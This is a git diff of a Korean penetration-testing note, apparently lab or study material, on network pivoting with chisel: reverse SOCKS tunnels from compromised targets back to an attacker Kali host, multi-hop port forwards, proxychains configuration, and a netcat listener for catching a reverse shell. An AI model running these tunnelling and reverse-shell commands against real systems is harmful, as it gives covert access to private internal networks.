@@ -20,15 +20,15 @@ https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux
 ### [Reverse Pivot]
 Kali에서 Target으로 요청을 보낼 때
 
-```bash title="공격자 서버 (chisel server 열기)"
+```bash
 chisel server -p 8081 --reverse &
 ```
 
 
-```bash title="공격자 Server의 /etc/proxychains4.conf 수정"
+```bash
 vim /etc/proxychains4.conf
 ```
-![[Pasted image 20250708230909.png]]
+![Pasted_image_20250708230909.png](/image/Pasted_image_20250708230909.png)
 맨 밑에다 추가
 ```text
 socks5 127.0.0.1 1080
@@ -36,17 +36,17 @@ socks5 127.0.0.1 1080
 
 
 
-```bash title="Target server에 chisel client 실행하링"
+```bash
 # 연결된 동안에도 다른 작업해야하기 때문에 백그라운드로 실행
 ./chisel client 10.250.180.2:8081 R:socks &
 ```
 
 
 
-```bash title="공격자 Server에서 proxychains로 명령어 실행"
+```bash
 proxychains -q curl 10.200.180.150
 ```
-![[Pasted image 20250708231334.png]]
+![Pasted_image_20250708231334.png](/image/Pasted_image_20250708231334.png)
 
 
 
@@ -65,11 +65,11 @@ proxychains -q curl 10.200.180.150
 대상에서 트래픽을 받을 때 (리버스 쉘 붙일 때)
 
 
-```bash title="공격자 Kali - chisel server"
+```bash
 chisel server -p 8000
 ```
 
-```bash title="Target 1 - chisel client, server"
+```bash
 chisel client [kali ip]:8000 9000:127.0.0.1:9010
 
 # Target 2에서 붙을 chisl server
@@ -79,17 +79,17 @@ Target 1 에서 9000번 포트를 열고 Target 1의 9000번 포트를 통한 �
 
 
 
-```bash title="Target 2 - chisel client"
+```bash
 chisel client [Target 1 ip]:8001 9001:127.0.0.1:9000
 ```
 
 
 
-```bash title="공격자 Kali 에서 포트 열고 대기"
+```bash
 rlwrap nc -lvnp 9010
 ```
 
-```powershell title="Target 3 - Target 2로 트래픽 테스트"
+```powershell
 Test-NetConnection [Target 1 ip] -Port 9001
 ```
 Target 2의 9001번 포트로 트래픽을 전송 -> Target 2으로 들어온 트래픽을 Target1 로 전송 -> Target1로 들어온 트래픽을 Kali로 전송 -> Kali로 들어온 트래픽은 Kali의 9010 포트로 나가셈.
@@ -105,11 +105,11 @@ Target 2의 9001번 포트로 트래픽을 전송 -> Target 2으로 들어온 �
 
 
 
-```bash title="Attacer Kali"
+```bash
 chisel server -p 9001 --reverse
 ```
 
-```plaintext title="/etc/proxychains4.conf"
+```plaintext
 # Target 개수에 맞춰줘야함
 
 # 1번째 터널 입구
@@ -124,7 +124,7 @@ socks5 127.0.0.1 7777
 
 Kali를 향한 `client`이자, Pivot 2를 위한 `server`.
 
-```bash title="Target 1"
+```bash
 # Kali로 접속 (1번 터널 생성)
 ./chisel client <Kali_IP>:9001 R:9999:socks
 
@@ -136,7 +136,7 @@ Kali를 향한 `client`이자, Pivot 2를 위한 `server`.
 
 Target 1을 향한 `client`이자, Pivot 3을 위한 `server`.
 
-```bash title="Target 2"
+```bash
 # Pivot 1로 접속 (2번 터널 생성)
 ./chisel client <Target1_IP>:9002 R:8888:socks
 
@@ -148,7 +148,7 @@ Target 1을 향한 `client`이자, Pivot 3을 위한 `server`.
 
 Target 2를 향한 `client`.
 
-```bash title="Target 3"
+```bash
 # Pivot 2로 접속 (3번 터널 생성)
 ./chisel client <Target2_IP>:9003 R:7777:socks
 ```
@@ -156,7 +156,7 @@ Target 2를 향한 `client`.
 
 
 터널링 
-```bash title="Attacker Kali"
+```bash
 # Target 3로 curl 명령 날릴 수 있음
 proxychains -q curl <Target3_IP>
 ```
